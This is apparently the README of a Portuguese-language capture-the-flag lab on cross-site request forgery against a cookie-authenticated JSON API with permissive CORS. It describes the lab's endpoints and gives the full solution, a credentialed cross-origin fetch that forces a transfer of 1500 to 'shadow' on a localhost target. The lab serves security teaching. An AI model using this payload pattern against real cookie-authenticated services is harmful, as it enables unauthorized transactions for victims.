# Desafio M13 — CSRF em API com Cookies

## Descrição
A aplicação expõe uma API autenticada por cookie e habilita CORS permissivo (`Access-Control-Allow-Origin: *` com credenciais). Isso permite que um site malicioso dispare transferências autenticadas a partir do navegador da vítima.

## Objetivos de Aprendizagem
- Revisitar conceitos de CSRF em APIs JSON.
- Explorar implicações de CORS permissivo combinado com cookies.
- Construir payloads HTML/JS para automatizar a transferência maliciosa.

## Serviços Disponíveis
- `GET /` — Define o cookie `session=analyst` e apresenta contexto.
- `GET /api/profile` — Mostra dados do usuário autenticado.
- `POST /api/transfer` — Executa transferências, retornando a flag se `to=shadow` e `amount>=1200`.

## Como Executar
1. Suba o container.
2. Abra `http://localhost:8080` para receber o cookie de sessão.
3. Reproduza, a partir de outra origem, uma chamada fetch para `/api/transfer` com credenciais.

## Como Capturar a Flag
- Utilize um script em outra origem (por exemplo, console do navegador) com:
  ```js
  fetch('http://localhost:8080/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'shadow', amount: 1500})
  });
  ```
- A resposta conterá a flag devido à transferência maliciosa.
